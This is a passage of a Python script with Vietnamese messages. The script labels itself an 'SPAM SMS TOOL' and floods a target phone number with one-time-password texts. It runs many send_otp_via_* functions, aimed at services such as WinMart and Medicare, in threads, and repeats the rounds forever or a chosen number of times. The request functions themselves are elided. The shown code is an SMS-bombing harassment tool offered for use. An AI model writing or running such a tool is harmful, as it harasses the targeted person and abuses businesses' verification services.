...
print('\033[1;32m SPAM SMS TOOL - RUNNING INFINITE MODE')
print('\033[0m')  # Reset màu
print("Tắt tool bấm Ctrl + C 2 lần")
print(f"Số điện thoại mục tiêu: {sys.argv[1] if len(sys.argv) > 1 else 'Không có'}")
print(f"Số lượng vòng lặp: {sys.argv[2] if len(sys.argv) > 2 else 'Vô hạn'}")
print("-" * 50)
...
OTP_FUNCTIONS = [
    ...
    send_otp_via_winmart,
    send_otp_via_medicare,  # Lưu ý: có 2 hàm medicare
...
def run_otp_functions(phone_number):
    """Chạy tất cả các hàm OTP cho số điện thoại"""
    threads = []
    
    for otp_function in OTP_FUNCTIONS:
        thread = threading.Thread(
            target=otp_function_wrapper,
            args=(otp_function, phone_number)
        )
        threads.append(thread)
        thread.start()
        time.sleep(0.1)  # Đệm nhẹ giữa các luồng
    
    # Chờ tất cả luồng hoàn thành
    for thread in threads:
        thread.join()

def otp_function_wrapper(func, phone_number):
    """Wrapper để xử lý lỗi cho mỗi hàm OTP"""
    try:
        semaphore.acquire()
        func(phone_number)
    except Exception as e:
        print(f"\033[1;31mLỗi trong {func.__name__}: {str(e)}\033[0m")
    finally:
        semaphore.release()
...
def main():
    ...
    if len(sys.argv) < 2:
        print("Sử dụng: python smsv2.py <số_điện_thoại> [số_vòng_lặp]")
        print("Ví dụ: python smsv2.py 0987654321 10")
        print("Ví dụ (vô hạn): python smsv2.py 0987654321")
        return
    ...
    if len(sys.argv) > 2:
        try:
            ...
            infinite_mode = False
            print(f"Chế độ: Có giới hạn ({max_loops} vòng)")
        except ValueError:
            max_loops = 0
            infinite_mode = True
            print("Chế độ: Vô hạn")
    ...
    try:
        while True:
            loop_count += 1
            print(f"\n\033[1;36m{'='*60}")
            print(f"VÒNG LẶP {loop_count} - {time.strftime('%H:%M:%S')}")
            print(f"{'='*60}\033[0m")
            
            # Chạy tất cả hàm OTP
            run_otp_functions(phone_number)
            
            print(f"\n\033[1;32m✓ Hoàn thành vòng lặp {loop_count}")
            print(f"  Số điện thoại: {phone_number}")
            print(f"  Thời gian: {time.strftime('%H:%M:%S')}\033[0m")
            
            # Kiểm tra điều kiện dừng
            if not infinite_mode and loop_count >= max_loops:
                print(f"\n\033[1;33mĐã hoàn thành {max_loops} vòng lặp. Dừng chương trình.\033[0m")
                break
            
            # Chờ trước khi bắt đầu vòng mới
            print(f"\n\033[1;35mChờ 30 giây trước khi bắt đầu vòng tiếp theo...\033[0m")
            time.sleep(30)
            
    except KeyboardInterrupt:
        print(f"\n\033[1;33m\nĐã dừng chương trình sau {loop_count} vòng lặp.\033[0m")
    except Exception as e:
        print(f"\n\033[1;31mLỗi không xác định: {str(e)}\033[0m")
